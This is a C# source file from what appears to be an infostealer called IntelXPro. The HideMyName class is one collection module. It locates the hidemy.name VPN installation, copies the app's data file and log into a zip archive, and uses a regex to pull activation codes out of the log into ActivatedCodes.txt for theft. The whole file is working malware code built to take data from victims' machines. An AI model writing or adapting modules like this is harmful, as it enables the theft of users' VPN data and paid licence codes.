using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class HideMyName : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = "C:\\Program Files\\hidemy.name VPN 2.0";
            if (!Directory.Exists(text))
            {
                return;
            }
            string text2 = "HideMyName";
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "HideMyName";
            if (File.Exists(text + "\\HideMyName"))
            {
                zip.AddFile(text2 + "\\HideMyName", File.ReadAllBytes(text + "\\HideMyName"));
                counterApplications.Files.Add(text + "\\HideMyName => " + text2 + "\\HideMyName");
            }
            if (File.Exists(text + "\\log-app.txt"))
            {
                zip.AddFile(text2 + "\\log-app.txt", File.ReadAllBytes(text + "\\log-app.txt"));
                counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\log-app.txt");
                List<string> list = new List<string>();
                foreach (Match item in new Regex("code\\s+(\\d+)").Matches(File.ReadAllText(text + "\\log-app.txt")))
                {
                    if (item.Success)
                    {
                        string value = item.Groups[1].Value;
                        if (!list.Contains(value))
                        {
                            list.Add(value);
                        }
                    }
                }
                if (list.Count() > 0)
                {
                    zip.AddTextFile(text2 + "\\ActivatedCodes.txt", string.Join("\n", list));
                    counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\ActivatedCodes.txt");
                }
            }
            counterApplications.Files.Add(text + " => " + text2);
            counterApplications.Files.Add(text2);
            counter.Vpns.Add(counterApplications);
        }
    }
}
